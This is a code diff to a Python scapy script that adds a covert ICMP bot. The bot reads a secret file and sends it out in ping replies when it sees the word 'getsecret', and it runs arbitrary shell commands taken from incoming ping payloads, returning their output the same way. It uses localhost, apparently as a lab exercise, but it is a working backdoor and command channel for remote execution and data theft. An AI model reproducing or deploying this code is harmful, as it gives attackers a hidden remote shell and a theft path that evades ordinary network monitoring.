@@ -2,6 +2,8 @@ import socket
 import time
 import os
 import random
+import subprocess
+from multiprocessing import Process
 import requests
 from scapy.all import *
 from scapy.layers.inet import ICMP, IP
@@ -52,13 +54,25 @@ def processPacket(packet):
     if packet[ICMP].type == 8:
         if Raw in packet:
             data = packet[Raw].load.decode()
-            if 'comm' in data:
-                packet.show()
-                # send a file
-                with open('secret.txt') as f:
-                    string = f.readline()
-                time.sleep(3)
-                send(IP(dst='localhost', src='localhost') / ICMP(type=0) / string.encode())
+            if 'getsecret' in data:
+                processSecret(packet)
+            if 'command' in data:
+                processCommand(packet)
+
+def processSecret(packet):
+    with open('secret.txt') as f:
+        string = "botreply" + f.readline()
+    time.sleep(1)
+    send(IP(dst='localhost', src='localhost') / ICMP(type=0) / string.encode())
+
+def processCommand(packet):
+    command = packet[Raw].load.decode()[7:]
+    print(command)
+    #return value of os.system?
+    returnStatement = subprocess.check_output(command, shell = True).decode()
+    returnStatement = "botreply" + returnStatement
+    time.sleep(1)
+    send(IP(dst='localhost', src='localhost') / ICMP(type=0) / returnStatement.encode())
 
 
 def sniffForPacket():
